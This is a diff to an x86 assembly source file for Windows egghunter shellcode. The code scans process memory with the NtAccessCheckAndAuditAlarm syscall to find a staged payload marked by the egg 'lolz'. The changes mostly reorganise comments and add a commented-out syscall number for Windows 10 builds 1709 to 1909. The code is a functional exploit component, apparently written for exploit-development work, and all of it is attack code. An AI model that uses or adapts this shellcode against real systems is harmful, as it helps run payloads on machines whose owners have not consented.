@@ -1,4 +1,4 @@
-; position independent non-NULL egghunter shellcode using NtAccessCheckAndAuditAlarm()
+; position independent non-NULL egghunter shellcode using NtAccessCheckAndAuditAlarm() - 32 to 35 bytes
 ; 
 ; NOTE system call numbers are not constant! get number for your target: 
 ;      https://j00ru.vexillium.org/syscalls/nt/32/
@@ -17,13 +17,18 @@ _start:
 check_next_address:
   inc   edx                ; increment the test pointer by one
   push  edx                ; save current edx since syscalls do not preserve registers
+  ; NOTE: currently set for Windows 7 and below
   push  0x2                ; push NtAccessCheckAndAuditAlarm system call number
-  pop   eax                ; pop into eax (!!! currently set for Windows 7 and below)
+  pop   eax                ; pop into eax 
+  ; NOTE: example for Windows 10 - build 1709 to 1909
+  ; xor   eax, eax           ; NULL eax
+  ; add   ax, 0x1c6          ; set NtAccessCheckAndAuditAlarm system call number
   int   0x2e               ; perform the syscall
   cmp   al, 0x05           ; did we get 0xc0000005 (ACCESS_VIOLATION) ?
   pop   edx                ; restore edx
   je    _start             ; invalid ptr? go to the next page
-  mov   eax, 0x7a6c6f6c    ; set egg flag in eax (!!! currently set to 'lolz')
+  ; NOTE: egg currently set to 'lolz'
+  mov   eax, 0x7a6c6f6c    ; set egg flag in eax 
   mov   edi, edx           ; set edi to the pointer we validated
   scasd                    ; compare the dword in edi to eax
   jnz   check_next_address ; no match? increment the pointer by one and try again
